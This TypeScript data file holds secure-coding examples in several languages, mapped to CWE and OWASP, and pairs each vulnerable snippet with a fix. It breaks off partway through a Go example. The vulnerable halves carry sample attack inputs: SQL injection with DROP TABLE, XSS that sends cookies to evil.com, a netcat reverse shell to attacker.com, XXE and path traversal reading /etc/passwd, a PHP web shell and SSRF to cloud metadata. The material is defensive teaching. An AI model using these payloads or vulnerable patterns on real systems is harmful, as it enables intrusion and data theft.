// Multi-language secure code examples with CWE/OWASP mapping
import { CodeExample } from "./code-examples-data";

export interface MultiLangCodeExample extends CodeExample {
  cweId?: string;
  cweName?: string;
  owaspId?: string;
  owaspName?: string;
}

export const multiLangCodeExamples: MultiLangCodeExample[] = [
  // ==================== PYTHON ====================
  {
    id: "py-sql-injection",
    title: "SQL Injection Prevention",
    language: "Python",
    category: "Injection",
    cweId: "CWE-89",
    cweName: "SQL Injection",
    owaspId: "A03:2021",
    owaspName: "Injection",
    description: "Prevent SQL injection in Python by using parameterized queries with database drivers and ORMs.",
    vulnerable: `# VULNERABLE — String formatting in SQL query
import sqlite3

def get_user(username):
    conn = sqlite3.connect('app.db')
    cursor = conn.cursor()
    # NEVER do this — direct string interpolation
    query = f"SELECT * FROM users WHERE username = '{username}'"
    cursor.execute(query)
    return cursor.fetchone()

# Attacker input: ' OR '1'='1' --
# Resulting query: SELECT * FROM users WHERE username = '' OR '1'='1' --'
# This returns ALL users in the database

# Even worse with DELETE:
# Input: '; DROP TABLE users; --`,
    secure: `# SECURE — Parameterized queries
import sqlite3
from sqlalchemy import create_engine, text
from sqlalchemy.orm import Session

# Option 1: sqlite3 parameterized query
def get_user_safe(username: str):
    conn = sqlite3.connect('app.db')
    cursor = conn.cursor()
    cursor.execute(
        "SELECT * FROM users WHERE username = ?",
        (username,)  # Parameters are safely escaped
    )
    return cursor.fetchone()

# Option 2: SQLAlchemy ORM (recommended)
engine = create_engine("sqlite:///app.db")

def get_user_orm(username: str):
    with Session(engine) as session:
        result = session.execute(
            text("SELECT * FROM users WHERE username = :name"),
            {"name": username}
        )
        return result.fetchone()

# Option 3: SQLAlchemy Model (best)
# user = session.query(User).filter_by(username=username).first()`,
    explanation: "Python's DB-API 2.0 supports parameterized queries with '?' or ':name' placeholders. SQLAlchemy ORM provides the strongest protection by abstracting SQL entirely. Never use f-strings, .format(), or % formatting in SQL queries.",
  },
  {
    id: "py-xss-prevention",
    title: "Cross-Site Scripting (XSS) Prevention",
    language: "Python",
    category: "XSS",
    cweId: "CWE-79",
    cweName: "Cross-site Scripting",
    owaspId: "A03:2021",
    owaspName: "Injection",
    description: "Prevent XSS attacks in Python web frameworks (Flask/Django) by proper output encoding.",
    vulnerable: `# VULNERABLE — Flask with unsafe rendering
from flask import Flask, request
from markupsafe import Markup

app = Flask(__name__)

@app.route('/search')
def search():
    query = request.args.get('q', '')
    # DANGEROUS — Marking user input as safe
    return f"""
    <html>
    <body>
        <h1>Search Results for: {query}</h1>
    </body>
    </html>
    """

# Attacker URL: /search?q=<script>document.location='https://evil.com/steal?c='+document.cookie</script>
# The script executes in the victim's browser`,
    secure: `# SECURE — Proper escaping and templating
from flask import Flask, request, render_template_string
from markupsafe import escape
import bleach

app = Flask(__name__)

# Option 1: Use escape() for manual rendering
@app.route('/search')
def search():
    query = escape(request.args.get('q', ''))
    return render_template_string("""
    <html><body>
        <h1>Search Results for: {{ query }}</h1>
    </body></html>
    """, query=query)

# Option 2: Use bleach for rich content
ALLOWED_TAGS = ['b', 'i', 'em', 'strong', 'p', 'br', 'ul', 'li']

@app.route('/comment', methods=['POST'])
def comment():
    raw_content = request.form.get('content', '')
    safe_content = bleach.clean(
        raw_content,
        tags=ALLOWED_TAGS,
        attributes={},
        strip=True
    )
    return render_template_string(
        '<div class="comment">{{ content|safe }}</div>',
        content=safe_content
    )

# Django auto-escapes by default in templates:
# {{ user_input }}  ← auto-escaped
# {{ user_input|safe }}  ← DANGEROUS, only use after sanitizing`,
    explanation: "Flask's Jinja2 templates auto-escape variables by default. Never use Markup() or |safe filter on untrusted input. Django also auto-escapes. For rich content, use bleach to whitelist allowed HTML tags and attributes.",
  },
  {
    id: "py-auth-bypass",
    title: "Authentication & Password Hashing",
    language: "Python",
    category: "Authentication",
    cweId: "CWE-916",
    cweName: "Use of Password Hash With Insufficient Computational Effort",
    owaspId: "A07:2021",
    owaspName: "Identification and Authentication Failures",
    description: "Secure password hashing and authentication implementation in Python.",
    vulnerable: `# VULNERABLE — Weak password storage
import hashlib

def register_user(username, password):
    # NEVER use MD5/SHA for passwords — too fast to brute-force
    password_hash = hashlib.md5(password.encode()).hexdigest()
    save_to_db(username, password_hash)

def login(username, password):
    stored_hash = get_hash_from_db(username)
    input_hash = hashlib.md5(password.encode()).hexdigest()
    # Timing attack vulnerable comparison
    if input_hash == stored_hash:
        return True
    return False

# Problems:
# 1. MD5 is broken — rainbow tables exist for common passwords
# 2. No salt — identical passwords produce identical hashes
# 3. == comparison is vulnerable to timing attacks
# 4. MD5 can compute billions of hashes/second on GPU`,
    secure: `# SECURE — bcrypt/argon2 password hashing
import bcrypt
from argon2 import PasswordHasher
import hmac

# Option 1: bcrypt (widely used, battle-tested)
def register_bcrypt(username: str, password: str):
    # bcrypt auto-generates a salt and uses adaptive hashing
    salt = bcrypt.gensalt(rounds=12)  # 2^12 iterations
    password_hash = bcrypt.hashpw(
        password.encode('utf-8'), salt
    )
    save_to_db(username, password_hash.decode('utf-8'))

def login_bcrypt(username: str, password: str) -> bool:
    stored_hash = get_hash_from_db(username)
    # bcrypt.checkpw is timing-safe
    return bcrypt.checkpw(
        password.encode('utf-8'),
        stored_hash.encode('utf-8')
    )

# Option 2: Argon2 (recommended — winner of PHC)
ph = PasswordHasher(
    time_cost=3,        # iterations
    memory_cost=65536,  # 64 MB memory
    parallelism=4       # threads
)

def register_argon2(username: str, password: str):
    password_hash = ph.hash(password)
    save_to_db(username, password_hash)

def login_argon2(username: str, password: str) -> bool:
    stored_hash = get_hash_from_db(username)
    try:
        return ph.verify(stored_hash, password)
    except Exception:
        return False`,
    explanation: "Use bcrypt (min 12 rounds) or Argon2id for password hashing. Both include built-in salts and are designed to be computationally expensive. Argon2 is the PHC winner and also resists GPU attacks via memory-hard design.",
  },
  {
    id: "py-command-injection",
    title: "Command Injection Prevention",
    language: "Python",
    category: "Injection",
    cweId: "CWE-78",
    cweName: "OS Command Injection",
    owaspId: "A03:2021",
    owaspName: "Injection",
    description: "Prevent OS command injection in Python applications.",
    vulnerable: `# VULNERABLE — Shell command injection
import os
import subprocess

def ping_host(hostname):
    # DANGEROUS — shell=True with user input
    result = os.system(f"ping -c 4 {hostname}")
    return result

def lookup_dns(domain):
    # DANGEROUS — user input in shell command
    output = subprocess.check_output(
        f"nslookup {domain}",
        shell=True
    )
    return output.decode()

# Attacker input: "example.com; cat /etc/passwd"
# Attacker input: "example.com && rm -rf /"
# Attacker input: "example.com | nc attacker.com 4444 -e /bin/sh"`,
    secure: `# SECURE — Safe subprocess usage
import subprocess
import shlex
import re

DOMAIN_REGEX = re.compile(
    r'^(?:[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?\\.)+[a-zA-Z]{2,}$'
)

def ping_host_safe(hostname: str) -> str:
    # Validate input format
    if not DOMAIN_REGEX.match(hostname):
        raise ValueError("Invalid hostname format")

    # Use list arguments — NO shell=True
    result = subprocess.run(
        ["ping", "-c", "4", hostname],
        capture_output=True,
        text=True,
        timeout=30
    )
    return result.stdout

def lookup_dns_safe(domain: str) -> str:
    if not DOMAIN_REGEX.match(domain):
        raise ValueError("Invalid domain format")

    # shlex.quote for additional safety if shell is needed
    result = subprocess.run(
        ["nslookup", domain],
        capture_output=True,
        text=True,
        timeout=10
    )
    return result.stdout

# Key rules:
# 1. NEVER use shell=True with user input
# 2. Pass arguments as a list, not a string
# 3. Validate/whitelist input format before use
# 4. Set timeouts to prevent hanging
# 5. Use shlex.quote() if shell expansion is unavoidable`,
    explanation: "Never use shell=True with subprocess when user input is involved. Pass command arguments as a list to avoid shell interpretation. Always validate and whitelist input formats before executing any system commands.",
  },
  {
    id: "py-ssrf",
    title: "Server-Side Request Forgery (SSRF) Prevention",
    language: "Python",
    category: "SSRF",
    cweId: "CWE-918",
    cweName: "Server-Side Request Forgery",
    owaspId: "A10:2021",
    owaspName: "Server-Side Request Forgery",
    description: "Prevent SSRF attacks in Python web applications.",
    vulnerable: `# VULNERABLE — No URL validation
import requests
from flask import Flask, request, jsonify

app = Flask(__name__)

@app.route('/api/fetch')
def fetch_url():
    url = request.args.get('url')
    # Attacker sends: http://169.254.169.254/latest/meta-data/
    # or: http://localhost:6379/CONFIG+SET+dir+/tmp/
    response = requests.get(url)
    return jsonify({"data": response.text})

# Attacker can:
# - Access AWS/GCP/Azure metadata endpoints
# - Scan internal network ports
# - Interact with internal services (Redis, Memcached)
# - Read local files via file:// protocol`,
    secure: `# SECURE — URL validation and allowlisting
import requests
import ipaddress
import socket
from urllib.parse import urlparse
from flask import Flask, request, jsonify

ALLOWED_SCHEMES = {'http', 'https'}
ALLOWED_DOMAINS = {'api.github.com', 'api.example.com'}
BLOCKED_CIDRS = [
    ipaddress.ip_network('10.0.0.0/8'),
    ipaddress.ip_network('172.16.0.0/12'),
    ipaddress.ip_network('192.168.0.0/16'),
    ipaddress.ip_network('127.0.0.0/8'),
    ipaddress.ip_network('169.254.0.0/16'),  # AWS metadata
    ipaddress.ip_network('fd00::/8'),
]

def is_safe_url(url: str) -> bool:
    try:
        parsed = urlparse(url)
        if parsed.scheme not in ALLOWED_SCHEMES:
            return False
        if parsed.hostname not in ALLOWED_DOMAINS:
            return False
        # Resolve DNS and check IP
        ip = socket.gethostbyname(parsed.hostname)
        ip_addr = ipaddress.ip_address(ip)
        for cidr in BLOCKED_CIDRS:
            if ip_addr in cidr:
                return False
        return True
    except Exception:
        return False

app = Flask(__name__)

@app.route('/api/fetch')
def fetch_url():
    url = request.args.get('url', '')
    if not is_safe_url(url):
        return jsonify({"error": "URL not allowed"}), 400
    response = requests.get(
        url,
        timeout=10,
        allow_redirects=False  # Prevent redirect-based SSRF
    )
    return jsonify({"data": response.text[:10000]})`,
    explanation: "Validate URL scheme, domain allowlist, and resolved IP address before making server-side requests. Block private/internal IP ranges. Disable redirects to prevent redirect-based SSRF. Limit response size.",
  },

  // ==================== JAVA ====================
  {
    id: "java-sql-injection",
    title: "SQL Injection Prevention",
    language: "Java",
    category: "Injection",
    cweId: "CWE-89",
    cweName: "SQL Injection",
    owaspId: "A03:2021",
    owaspName: "Injection",
    description: "Prevent SQL injection in Java using PreparedStatement, JPA, and Hibernate.",
    vulnerable: `// VULNERABLE — String concatenation in SQL
public class UserDAO {
    public User getUser(String username) throws SQLException {
        Connection conn = DriverManager.getConnection(DB_URL);
        // NEVER concatenate user input into SQL
        String query = "SELECT * FROM users WHERE username = '" 
                       + username + "'";
        Statement stmt = conn.createStatement();
        ResultSet rs = stmt.executeQuery(query);
        // ...
        return user;
    }

    public List<User> searchUsers(String name) throws SQLException {
        // Also vulnerable with String.format
        String query = String.format(
            "SELECT * FROM users WHERE name LIKE '%%%s%%'", name
        );
        // Attacker input: %'; DROP TABLE users; --
    }
}`,
    secure: `// SECURE — PreparedStatement and JPA
import java.sql.*;
import javax.persistence.*;

public class UserDAO {
    // Option 1: PreparedStatement (JDBC)
    public User getUser(String username) throws SQLException {
        String sql = "SELECT * FROM users WHERE username = ?";
        try (Connection conn = dataSource.getConnection();
             PreparedStatement ps = conn.prepareStatement(sql)) {
            ps.setString(1, username);  // Auto-escaped
            try (ResultSet rs = ps.executeQuery()) {
                if (rs.next()) {
                    return mapUser(rs);
                }
            }
        }
        return null;
    }

    // Option 2: JPA Criteria API (type-safe, no SQL strings)
    @PersistenceContext
    private EntityManager em;

    public User getUserJPA(String username) {
        CriteriaBuilder cb = em.getCriteriaBuilder();
        CriteriaQuery<User> cq = cb.createQuery(User.class);
        Root<User> root = cq.from(User.class);
        cq.where(cb.equal(root.get("username"), username));
        return em.createQuery(cq).getSingleResult();
    }

    // Option 3: Spring Data JPA Repository (recommended)
    // public interface UserRepository extends JpaRepository<User, Long> {
    //     Optional<User> findByUsername(String username);
    //     @Query("SELECT u FROM User u WHERE u.name LIKE %:name%")
    //     List<User> searchByName(@Param("name") String name);
    // }
}`,
    explanation: "Java's PreparedStatement automatically escapes parameters. JPA Criteria API provides type-safe queries. Spring Data JPA repositories abstract SQL completely. Never use Statement with concatenated strings.",
  },
  {
    id: "java-deserialization",
    title: "Insecure Deserialization Prevention",
    language: "Java",
    category: "Insecure Deserialization",
    cweId: "CWE-502",
    cweName: "Deserialization of Untrusted Data",
    owaspId: "A08:2021",
    owaspName: "Software and Data Integrity Failures",
    description: "Prevent Java deserialization attacks that can lead to remote code execution.",
    vulnerable: `// VULNERABLE — Deserializing untrusted data
import java.io.*;

public class DataHandler {
    // DANGEROUS — accepting serialized objects from clients
    public Object deserializeData(byte[] data) 
            throws Exception {
        ByteArrayInputStream bis = new ByteArrayInputStream(data);
        ObjectInputStream ois = new ObjectInputStream(bis);
        // This can execute arbitrary code via gadget chains!
        return ois.readObject();
    }

    // Common attack vectors:
    // - HTTP request bodies with serialized Java objects
    // - JMX connections
    // - RMI endpoints
    // - Custom protocols using Java serialization
    
    // Attacker uses tools like ysoserial to generate payloads:
    // java -jar ysoserial.jar CommonsCollections1 'calc.exe'
}`,
    secure: `// SECURE — Safe deserialization practices
import java.io.*;
import com.fasterxml.jackson.databind.ObjectMapper;

public class DataHandler {
    // Option 1: Use JSON instead of Java serialization
    private final ObjectMapper mapper = new ObjectMapper();

    public UserDTO deserializeJSON(String json) throws Exception {
        // Deserialize to specific class, not Object
        return mapper.readValue(json, UserDTO.class);
    }

    // Option 2: If Java serialization is required, use allowlist
    public Object deserializeSafe(byte[] data) throws Exception {
        ByteArrayInputStream bis = new ByteArrayInputStream(data);
        ObjectInputStream ois = new ObjectInputStream(bis) {
            @Override
            protected Class<?> resolveClass(ObjectStreamClass desc)
                    throws IOException, ClassNotFoundException {
                // ALLOWLIST of permitted classes
                String[] allowed = {
                    "com.myapp.dto.UserDTO",
                    "com.myapp.dto.OrderDTO",
                    "java.lang.String",
                    "java.util.ArrayList"
                };
                for (String cls : allowed) {
                    if (desc.getName().equals(cls)) {
                        return super.resolveClass(desc);
                    }
                }
                throw new InvalidClassException(
                    "Unauthorized class: " + desc.getName()
                );
            }
        };
        return ois.readObject();
    }

    // Option 3: Use serialization filters (Java 9+)
    // ObjectInputFilter filter = ObjectInputFilter.Config
    //     .createFilter("com.myapp.dto.*;!*");
}`,
    explanation: "Java deserialization vulnerabilities can lead to RCE via gadget chains in common libraries. Prefer JSON/Protocol Buffers over Java serialization. If Java serialization is required, use class allowlists or Java 9+ serialization filters.",
  },
  {
    id: "java-xxe",
    title: "XML External Entity (XXE) Prevention",
    language: "Java",
    category: "Injection",
    cweId: "CWE-611",
    cweName: "Improper Restriction of XML External Entity Reference",
    owaspId: "A05:2021",
    owaspName: "Security Misconfiguration",
    description: "Prevent XXE attacks in Java XML processing.",
    vulnerable: `// VULNERABLE — Default XML parser allows XXE
import javax.xml.parsers.*;
import org.w3c.dom.*;

public class XMLProcessor {
    public Document parseXML(String xmlInput) throws Exception {
        DocumentBuilderFactory factory = 
            DocumentBuilderFactory.newInstance();
        // Default factory allows external entities!
        DocumentBuilder builder = factory.newDocumentBuilder();
        return builder.parse(
            new InputSource(new StringReader(xmlInput))
        );
    }
}

// Attacker sends:
// <?xml version="1.0"?>
// <!DOCTYPE foo [
//   <!ENTITY xxe SYSTEM "file:///etc/passwd">
// ]>
// <user><name>&xxe;</name></user>
//
// This reads /etc/passwd from the server!
// Can also use: http://internal-server/secret
//              php://filter/convert.base64-encode/resource=config.php`,
    secure: `// SECURE — Disable external entities and DTDs
import javax.xml.parsers.*;
import org.w3c.dom.*;

public class XMLProcessor {
    public Document parseXMLSafe(String xmlInput) throws Exception {
        DocumentBuilderFactory factory = 
            DocumentBuilderFactory.newInstance();

        // Disable ALL external entity processing
        factory.setFeature(
            "http://apache.org/xml/features/disallow-doctype-decl",
            true
        );
        factory.setFeature(
            "http://xml.org/sax/features/external-general-entities",
            false
        );
        factory.setFeature(
            "http://xml.org/sax/features/external-parameter-entities",
            false
        );
        factory.setFeature(
            "http://apache.org/xml/features/nonvalidating/load-external-dtd",
            false
        );
        factory.setXIncludeAware(false);
        factory.setExpandEntityReferences(false);

        DocumentBuilder builder = factory.newDocumentBuilder();
        return builder.parse(
            new InputSource(new StringReader(xmlInput))
        );
    }

    // Alternative: Use JAXB with safe defaults
    // Or better yet — use JSON instead of XML where possible
}`,
    explanation: "Java's default XML parsers allow external entity resolution, enabling file reads and SSRF. Always disable DTDs and external entities. Consider using JSON instead of XML where possible.",
  },
  {
    id: "java-path-traversal",
    title: "Path Traversal Prevention",
    language: "Java",
    category: "Access Control",
    cweId: "CWE-22",
    cweName: "Path Traversal",
    owaspId: "A01:2021",
    owaspName: "Broken Access Control",
    description: "Prevent path traversal attacks in Java file operations.",
    vulnerable: `// VULNERABLE — No path validation
import java.io.*;
import javax.servlet.http.*;

public class FileServlet extends HttpServlet {
    private static final String UPLOAD_DIR = "/var/uploads/";

    protected void doGet(HttpServletRequest req, 
                         HttpServletResponse resp) 
            throws IOException {
        String filename = req.getParameter("file");
        // DANGEROUS — attacker can use ../../etc/passwd
        File file = new File(UPLOAD_DIR + filename);
        FileInputStream fis = new FileInputStream(file);
        // ... serve file content
    }
}

// Attacker request: /download?file=../../etc/passwd
// Attacker request: /download?file=....//....//etc/shadow
// Attacker request: /download?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd`,
    secure: `// SECURE — Canonicalize and validate paths
import java.io.*;
import java.nio.file.*;
import javax.servlet.http.*;

public class FileServlet extends HttpServlet {
    private static final Path UPLOAD_DIR = 
        Paths.get("/var/uploads/").toAbsolutePath().normalize();

    protected void doGet(HttpServletRequest req, 
                         HttpServletResponse resp) 
            throws IOException {
        String filename = req.getParameter("file");
        
        // Reject null or empty
        if (filename == null || filename.isEmpty()) {
            resp.sendError(400, "Filename required");
            return;
        }

        // Resolve and normalize the path
        Path filePath = UPLOAD_DIR
            .resolve(filename)
            .toAbsolutePath()
            .normalize();

        // Verify the resolved path is within UPLOAD_DIR
        if (!filePath.startsWith(UPLOAD_DIR)) {
            resp.sendError(403, "Access denied");
            return;
        }

        // Verify file exists and is a regular file
        if (!Files.exists(filePath) || !Files.isRegularFile(filePath)) {
            resp.sendError(404, "File not found");
            return;
        }

        // Whitelist allowed extensions
        String name = filePath.getFileName().toString();
        if (!name.matches("[a-zA-Z0-9._-]+\\\\.(pdf|png|jpg|txt)")) {
            resp.sendError(403, "File type not allowed");
            return;
        }

        // Safely serve the file
        resp.setContentType(Files.probeContentType(filePath));
        Files.copy(filePath, resp.getOutputStream());
    }
}`,
    explanation: "Always resolve paths to their canonical form and verify they remain within the intended directory. Use Path.normalize() to eliminate '../' sequences, then check with startsWith(). Whitelist allowed file extensions.",
  },

  // ==================== PHP ====================
  {
    id: "php-sql-injection",
    title: "SQL Injection Prevention",
    language: "PHP",
    category: "Injection",
    cweId: "CWE-89",
    cweName: "SQL Injection",
    owaspId: "A03:2021",
    owaspName: "Injection",
    description: "Prevent SQL injection in PHP using PDO prepared statements and Eloquent ORM.",
    vulnerable: `<?php
// VULNERABLE — Direct variable interpolation
function getUser($username) {
    $conn = new mysqli("localhost", "root", "", "app");
    // NEVER directly embed user input into SQL
    $result = $conn->query(
        "SELECT * FROM users WHERE username = '$username'"
    );
    return $result->fetch_assoc();
}

// Also vulnerable:
$id = $_GET['id'];
$sql = "DELETE FROM posts WHERE id = " . $id;
mysql_query($sql);  // deprecated AND vulnerable

// Attacker input: ' UNION SELECT password FROM users WHERE '1'='1
// Attacker input: 1; DROP TABLE users; --
?>`,
    secure: `<?php
// SECURE — PDO Prepared Statements
function getUserSafe(string $username): ?array {
    $pdo = new PDO(
        'mysql:host=localhost;dbname=app;charset=utf8mb4',
        'app_user',
        'secure_password',
        [
            PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
            PDO::ATTR_EMULATE_PREPARES => false, // Use real prepared statements
            PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
        ]
    );

    $stmt = $pdo->prepare(
        "SELECT id, username, email FROM users WHERE username = :username"
    );
    $stmt->execute(['username' => $username]);
    return $stmt->fetch() ?: null;
}

// Laravel Eloquent ORM (recommended for Laravel apps)
// $user = User::where('username', $username)->first();
// $users = User::whereIn('id', $ids)->get();

// Query Builder with bindings
// $user = DB::select(
//     'SELECT * FROM users WHERE username = ?',
//     [$username]
// );
?>`,
    explanation: "Always use PDO with prepared statements and ATTR_EMULATE_PREPARES set to false for real server-side prepared statements. Laravel's Eloquent ORM and Query Builder automatically parameterize queries.",
  },
  {
    id: "php-file-upload",
    title: "Secure File Upload",
    language: "PHP",
    category: "File Security",
    cweId: "CWE-434",
    cweName: "Unrestricted Upload of File with Dangerous Type",
    owaspId: "A04:2021",
    owaspName: "Insecure Design",
    description: "Implement secure file upload handling in PHP to prevent RCE and web shell uploads.",
    vulnerable: `<?php
// VULNERABLE — No validation on file upload
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $target = "uploads/" . $_FILES['file']['name'];
    // DANGEROUS — directly using user-provided filename
    move_uploaded_file($_FILES['file']['tmp_name'], $target);
    echo "File uploaded to: $target";
}
// Attacker uploads: shell.php containing <?php system($_GET['cmd']); ?>
// Then visits: /uploads/shell.php?cmd=cat+/etc/passwd
// Full server compromise!

// Also vulnerable to:
// - Double extensions: image.php.jpg
// - Null bytes: image.php%00.jpg (older PHP)
// - .htaccess upload to enable PHP execution in uploads dir
?>`,
    secure: `<?php
// SECURE — Comprehensive file upload validation
function handleUpload(array $file): array {
    $maxSize = 5 * 1024 * 1024; // 5MB
    $allowedMimes = [
        'image/jpeg', 'image/png', 'image/gif', 'image/webp',
        'application/pdf',
    ];
    $allowedExts = ['jpg', 'jpeg', 'png', 'gif', 'webp', 'pdf'];

    // Check upload errors
    if ($file['error'] !== UPLOAD_ERR_OK) {
        throw new RuntimeException('Upload failed');
    }

    // Check file size
    if ($file['size'] > $maxSize) {
        throw new RuntimeException('File too large');
    }

    // Verify MIME type using fileinfo (not user-supplied type)
    $finfo = new finfo(FILEINFO_MIME_TYPE);
    $mime = $finfo->file($file['tmp_name']);
    if (!in_array($mime, $allowedMimes, true)) {
        throw new RuntimeException('Invalid file type');
    }

    // Validate extension
    $ext = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION));
    if (!in_array($ext, $allowedExts, true)) {
        throw new RuntimeException('Invalid extension');
    }

    // Generate random filename — NEVER use original name
    $newName = bin2hex(random_bytes(16)) . '.' . $ext;
    $uploadDir = '/var/www/uploads/'; // Outside web root ideally 
    $destination = $uploadDir . $newName;

    if (!move_uploaded_file($file['tmp_name'], $destination)) {
        throw new RuntimeException('Failed to save file');
    }

    // Set restrictive permissions
    chmod($destination, 0644);

    return ['filename' => $newName, 'path' => $destination];
}

// In .htaccess for uploads directory:
// php_flag engine off
// RemoveHandler .php .phtml .php3 .php4 .php5
// AddType application/octet-stream .php .phtml
?>`,
    explanation: "Never trust user-supplied filenames or MIME types. Use finfo to detect actual file type from content. Generate random filenames. Store uploads outside the web root or disable PHP execution in the uploads directory.",
  },
  {
    id: "php-xss",
    title: "Cross-Site Scripting (XSS) Prevention",
    language: "PHP",
    category: "XSS",
    cweId: "CWE-79",
    cweName: "Cross-site Scripting",
    owaspId: "A03:2021",
    owaspName: "Injection",
    description: "Prevent XSS attacks in PHP applications with proper output encoding.",
    vulnerable: `<?php
// VULNERABLE — Direct output of user input
$name = $_GET['name'];
echo "<h1>Welcome, $name</h1>";

// Also vulnerable:
echo '<input value="' . $_POST['email'] . '">';

// In JavaScript context:
echo "<script>var user = '" . $username . "';</script>";

// Attacker input: <script>fetch('https://evil.com?c='+document.cookie)</script>
// Attacker input: " onfocus="alert(document.cookie)" autofocus="
?>`,
    secure: `<?php
// SECURE — Proper output encoding for each context

// HTML context — use htmlspecialchars
function e(string $str): string {
    return htmlspecialchars($str, ENT_QUOTES | ENT_HTML5, 'UTF-8');
}

$name = $_GET['name'] ?? '';
echo "<h1>Welcome, " . e($name) . "</h1>";
echo '<input value="' . e($_POST['email'] ?? '') . '">';

// JavaScript context — JSON encode
$userData = ['name' => $name, 'role' => 'user'];
echo '<script>var user = ' . json_encode(
    $userData,
    JSON_HEX_TAG | JSON_HEX_APOS | JSON_HEX_QUOT | JSON_HEX_AMP
) . ';</script>';

// URL context — urlencode
echo '<a href="/search?q=' . urlencode($query) . '">Search</a>';

// CSS context — whitelist allowed values
$color = in_array($userColor, ['red','blue','green']) ? $userColor : 'black';
echo "<div style='color: {$color}'>";

// Laravel Blade auto-escapes:
// {{ $name }}  ← auto-escaped
// {!! $html !!}  ← RAW — dangerous, only after purifying
?>`,
    explanation: "Use htmlspecialchars() with ENT_QUOTES for HTML context, json_encode() with hex flags for JavaScript context, and urlencode() for URL context. Laravel Blade's {{ }} syntax auto-escapes. Never use {!! !!} on untrusted input.",
  },

  // ==================== C# ====================
  {
    id: "csharp-sql-injection",
    title: "SQL Injection Prevention",
    language: "C#",
    category: "Injection",
    cweId: "CWE-89",
    cweName: "SQL Injection",
    owaspId: "A03:2021",
    owaspName: "Injection",
    description: "Prevent SQL injection in C#/.NET using parameterized queries and Entity Framework.",
    vulnerable: `// VULNERABLE — String concatenation in SQL
using System.Data.SqlClient;

public class UserRepository
{
    public User GetUser(string username)
    {
        var conn = new SqlConnection(connectionString);
        // NEVER concatenate user input into SQL!
        var query = $"SELECT * FROM Users WHERE Username = '{username}'";
        var cmd = new SqlCommand(query, conn);
        conn.Open();
        var reader = cmd.ExecuteReader();
        // ...

        // Attacker input: ' OR '1'='1' ; DROP TABLE Users; --
    }

    public List<User> SearchUsers(string name)
    {
        // Also vulnerable with String.Format
        var query = String.Format(
            "SELECT * FROM Users WHERE Name LIKE '%{0}%'", name
        );
        // ...
    }
}`,
    secure: `// SECURE — Parameterized queries and EF Core
using Microsoft.Data.SqlClient;
using Microsoft.EntityFrameworkCore;

public class UserRepository
{
    // Option 1: SqlCommand with parameters
    public User? GetUser(string username)
    {
        using var conn = new SqlConnection(_connectionString);
        var query = "SELECT * FROM Users WHERE Username = @Username";
        using var cmd = new SqlCommand(query, conn);
        cmd.Parameters.AddWithValue("@Username", username);
        conn.Open();
        using var reader = cmd.ExecuteReader();
        return reader.Read() ? MapUser(reader) : null;
    }

    // Option 2: Dapper (micro-ORM)
    public User? GetUserDapper(string username)
    {
        using var conn = new SqlConnection(_connectionString);
        return conn.QueryFirstOrDefault<User>(
            "SELECT * FROM Users WHERE Username = @Username",
            new { Username = username }
        );
    }

    // Option 3: Entity Framework Core (recommended)
    private readonly AppDbContext _db;

    public async Task<User?> GetUserEF(string username)
    {
        return await _db.Users
            .Where(u => u.Username == username)
            .FirstOrDefaultAsync();
    }

    public async Task<List<User>> SearchUsersEF(string name)
    {
        return await _db.Users
            .Where(u => EF.Functions.Like(u.Name, $"%{name}%"))
            .ToListAsync();
    }
}`,
    explanation: "C#/.NET supports parameterized queries with @Parameter syntax. Entity Framework Core provides the safest abstraction. Dapper offers a lightweight alternative with parameterized queries. Never concatenate strings into SQL.",
  },
  {
    id: "csharp-xss",
    title: "Cross-Site Scripting (XSS) Prevention",
    language: "C#",
    category: "XSS",
    cweId: "CWE-79",
    cweName: "Cross-site Scripting",
    owaspId: "A03:2021",
    owaspName: "Injection",
    description: "Prevent XSS attacks in ASP.NET Core applications.",
    vulnerable: `// VULNERABLE — Raw HTML output
@using Microsoft.AspNetCore.Mvc.Rendering

<!-- Razor view — using Html.Raw on user input -->
<div>@Html.Raw(Model.UserComment)</div>

<!-- Also vulnerable in JavaScript context -->
<script>
    var username = '@Model.Username';
    // Attacker: '; fetch('https://evil.com?c='+document.cookie); //
</script>

// Controller returning unsafe HTML
public IActionResult Profile()
{
    ViewBag.Bio = userInput; // Passed to @Html.Raw in view
    return View();
}`,
    secure: `// SECURE — Proper encoding in ASP.NET Core
@using System.Text.Encodings.Web

<!-- Razor auto-encodes by default — this is safe: -->
<div>@Model.UserComment</div>
<input value="@Model.Username" />

<!-- For JavaScript context, use JavaScriptEncoder: -->
@inject JavaScriptEncoder jsEncoder
<script>
    var username = "@jsEncoder.Encode(Model.Username)";
    // Or use JSON serialization:
    var userData = @Html.Raw(Json.Serialize(Model.SafeData));
</script>

// For rich content — use HtmlSanitizer NuGet package
using Ganss.Xss;

public class CommentService
{
    private static readonly HtmlSanitizer _sanitizer = new();

    static CommentService()
    {
        _sanitizer.AllowedTags.Clear();
        _sanitizer.AllowedTags.Add("b");
        _sanitizer.AllowedTags.Add("i");
        _sanitizer.AllowedTags.Add("em");
        _sanitizer.AllowedTags.Add("strong");
        _sanitizer.AllowedTags.Add("p");
        _sanitizer.AllowedTags.Add("br");
        _sanitizer.AllowedAttributes.Clear();
    }

    public string SanitizeComment(string html)
    {
        return _sanitizer.Sanitize(html);
    }
}

// Content-Security-Policy header in Startup.cs:
// app.Use(async (ctx, next) => {
//     ctx.Response.Headers.Append(
//         "Content-Security-Policy",
//         "default-src 'self'; script-src 'self'");
//     await next();
// });`,
    explanation: "Razor views auto-encode @ expressions by default. Never use @Html.Raw() on untrusted input. Use JavaScriptEncoder for JS contexts. For rich content, use the HtmlSanitizer NuGet package. Add CSP headers as defense-in-depth.",
  },

  // ==================== GO ====================
  {
    id: "go-sql-injection",
    title: "SQL Injection Prevention",
    language: "Go",
    category: "Injection",
    cweId: "CWE-89",
    cweName: "SQL Injection",
    owaspId: "A03:2021",
    owaspName: "Injection",
    description: "Prevent SQL injection in Go using database/sql parameterized queries and GORM.",
    vulnerable: `// VULNERABLE — String concatenation in SQL
package main

import (
    "database/sql"
    "fmt"
    "net/http"
)

func getUserHandler(w http.ResponseWriter, r *http.Request) {
    username := r.URL.Query().Get("username")

    // NEVER use fmt.Sprintf for SQL queries!
    query := fmt.Sprintf(
        "SELECT * FROM users WHERE username = '%s'", username,
    )
